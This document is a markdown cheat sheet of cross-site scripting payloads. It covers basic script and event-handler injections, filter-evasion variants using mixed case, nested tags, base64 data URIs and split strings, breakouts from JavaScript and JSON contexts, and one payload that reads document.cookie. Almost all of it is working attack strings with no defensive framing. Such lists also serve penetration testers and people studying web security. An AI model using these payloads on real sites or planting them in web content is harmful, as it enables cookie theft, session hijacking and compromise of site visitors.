# Basic XSS Payloads

```
<script>alert(1)</script>
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
contentvisibilityautostatechange='alert(1)'
via invalid tag -- 22 foo="bar<h1>">test</22>
<22 foo="bar<img src=x onerror="alert()">test</22>
```

# Bypassing Filters
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=JaVaScRiPt:alert(1)>
<svg><script xlink:href=data:,alert(1)></script></svg>
<svg><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a></svg>
<details open ontoggle=confirm(1)>
onToggLe='let%20x=%60javascri%60%3Blet%20y=%60pt:aler%60%3Blet%20z=%60t()%60%3Blet%20a=x+y+z%3Blocation=a'> ==>  onToggLe='let x=`javascri`;let y=`pt:aler`;let z=`t()`;let a=x y z;location=a'>

```
# DOM XSS Payloads (Assume input is reflected into JS)
```
';alert(1);// 
";alert(1);// 
</script><script>alert(1)</script>
'+document.domain+' 
"><svg onload=confirm(document.cookie)>
```
# JSON/JS Injection Payloads (Context: inside a JSON/JS response)
```
"};alert(1);//
');alert(1);//
",";alert(1);//
```
if there is encodeurlcomponent() function:

it escapes all the chars but not 
```A–Z a–z 0–9 - _ . ! ~ * ' ( )```


